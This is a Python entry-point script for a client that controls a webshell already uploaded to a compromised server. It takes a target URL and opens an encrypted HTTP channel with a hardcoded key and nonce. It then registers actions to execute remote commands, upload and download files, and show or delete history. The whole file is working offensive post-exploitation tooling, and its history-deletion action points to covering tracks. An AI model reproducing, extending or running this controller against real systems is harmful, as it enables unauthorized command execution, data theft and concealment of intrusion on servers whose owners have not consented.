import getopt
import sys
import textwrap

from client.client import Client
from client.http_service import HTTPService
from client.execute_command_action import ExecuteCommandAction
from client.upload_file_action import UploadFileAction
from client.download_file_action import DownloadFileAction
from client.show_history_action import ShowHistoryAction 
from client.delete_history_action import DeleteHistoryAction
from client.show_help_action import ShowHelpAction

def parse_arguments() -> dict[str, str]:
    # Parse the arguments
    options = 'u:h'
    long_options = ['url=', 'help']
    options, _ = getopt.getopt(sys.argv[1:], options, long_options)

    url = None
    for opt, arg in options:
        if opt in ['-u', '--url']:
            url = arg
        elif opt in ['-h', '--help']:
            show_help()
            exit(0)
        else:
            show_help()
            exit(1)

    # Check if a URL was supplied
    if url == None:
        print('Error: an url must be supplied. Use --help to show the help menu')
        exit(1)

    return { 'url': url }

def show_help() -> None:
    help = '''
    Description:

    Client program to interact with the uploaded webshell.

    Syntax:
    
    python -m client -u https://www.example.com/webshell
    python -m client --url=https://www.example.com/webshell


    Arguments:

    -u <url>, --url <url> : target url where the webshell is accessible
    -h, --help            : help menu

    Actions:

    Once the interactive session is established, the following command can
    be issued to see all available options:

    !help

    '''
    print(textwrap.dedent(help))

if __name__ == '__main__':
    # Parse arguments
    args = parse_arguments()

    # Initialize HTTP Service
    key = bytes.fromhex('3b151a68047f4dcb2ba7a0fd58f670460366defdcce02236906e17f2332f6b64')
    nonce = '5cd6313bebd006dc5d19cf5175f9cba6'
    HTTPService().initialize(args['url'], key, nonce)

    # Create list of actions
    actions = {
        'execute_command': ExecuteCommandAction(),
        'upload_file': UploadFileAction(),
        'download_file': DownloadFileAction(),
        'show_history': ShowHistoryAction(),
        'delete_history': DeleteHistoryAction(),
        'show_help': ShowHelpAction()
    }

    # Run the client
    client = Client(actions)
    client.run()
